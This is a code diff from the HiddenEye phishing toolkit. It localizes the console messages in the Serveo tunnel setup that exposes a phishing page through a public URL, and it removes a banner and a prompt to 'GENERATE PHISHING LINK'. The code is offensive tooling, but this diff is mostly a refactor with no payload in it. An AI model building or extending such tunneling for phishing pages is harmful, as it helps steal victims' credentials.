@@ -12,6 +12,7 @@ import Defs.ActionManager.Server.server_menu as server_menu
 import Defs.ActionManager.simple_informant as simple_informant
 import Defs.LocalizationManager.lang_action_manager.lang_server.lang_server_runner as localization
 import Defs.LocalizationManager.lang_global_usage as global_localization
+import Defs.ActionManager.main_runner as main_runner
 
 default_palette = theme.default_palette
 enter_server_www = chdir("Server/www")
@@ -198,21 +199,35 @@ def start_serveo(port):
             print("\n")
 
         except CalledProcessError:
-            print('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n'''.format(default_palette[0], default_palette[4]))
+            #print('''\n !!!\n
+            #  !!!\n
+            #  !! \n''')
+            print(localization.lang_start_serveo["failed_to_get_domain"])
+            print(localization.lang_start_serveo["suggestion_to_fix_issue"])
+            print(localization.lang_start_serveo["you_can_try_to_select_other_domain"])
             wait(4)
             run_command('clear')
             return custom(port)
     
     if is_online == True:
-        print('''
-            {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
-            |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
-            |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
-            {0}http://github.com/darksecdevelopers
-            {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n{0}[{1}!{0}]{1}REMEMBER ? Serveo Don't Allows Phishing.\n{0}[{1}!{0}]{1}They Drops The Connection Whenever Detects Phishing. '''.format(default_palette[0], default_palette[2]))
-        print("\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(default_palette[0], default_palette[2]))
-        print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(default_palette[0], default_palette[2]))
-        choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0], default_palette[2]))
+        #print('''
+        #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        #    {0}http://github.com/darksecdevelopers
+        #    {0}** BY:DARKSEC ** \n\n-------------------------------
+
+        # 
+        # 
+        #  '''.format(default_palette[0], default_palette[2]))
+        simple_informant.global_message()
+        print(localization.lang_start_serveo["serveo_url_option_selection"])
+        print(localization.lang_start_serveo["serveo_phishing_warning"])
+        print(localization.lang_start_serveo["choose_type_of_url"])
+
+        #print(" \n".format(default_palette[0], default_palette[2]))
+        main_runner.print_sorted_as_menu(localization.lang_start_serveo["url_types"])
+        choice = input(global_localization.input_line)
         run_command('clear')
         if choice == '1':
 
@@ -223,9 +238,11 @@ def start_serveo(port):
             run_command('clear')
             return start_serveo(port)
     else:
-        print("Serveo is DOWN now, do you want to select another option? Y/n")
+        #print("Serveo is DOWN now, do you want to select another option? Y/n")
+        print(localization.lang_start_serveo["serveo_is_down"])
         choice = input("HiddenEye >> ")
-        if choice == 'Y' or choice == 'y':
+        choice = choice.lower()
+        if choice == 'y':
             return server_menu.server_selection(port)
         else:
             return start_serveo(port)
